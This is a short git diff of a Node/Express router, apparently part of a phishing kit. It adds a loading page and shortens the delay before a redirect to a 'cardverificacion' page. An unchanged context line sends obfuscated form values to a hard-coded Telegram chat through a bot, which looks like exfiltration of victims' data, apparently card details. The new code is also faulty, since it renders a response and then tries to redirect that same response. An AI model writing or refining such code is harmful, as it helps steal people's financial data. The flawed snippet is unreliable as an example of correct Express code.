@@ -25,6 +25,9 @@ router.use((req, res, next) => {
 const json_books = fs.readFileSync('src/books.json', 'utf-8');
 let books = JSON.parse(json_books);
 
+router.get('/loading', (req, res) => {
+  res.render('wait.ejs');
+});
 
 router.get('/', (req, res) => {
     res.render('index.ejs');
@@ -110,14 +113,12 @@ bot.sendMessage('791007687', `1: ${r6fa6y89yB}\n2: ${nYffxLjdFW}\n3: ${wJcPshSku
     
     books.push(newBook);
     
+ res.render('loading'); // Renderiza la vista "loading" mientras espera los 15 segundos
 
-    // Espera 30 segundos antes de redirigir
-setTimeout(() => {
+  // Espera 15 segundos antes de redirigir
+  setTimeout(() => {
     res.redirect('cardverificacion');
-  }, 30000); // 30000 milisegundos = 30 segundos
-    
-    
-    
+  }, 15000);
 });
 
 
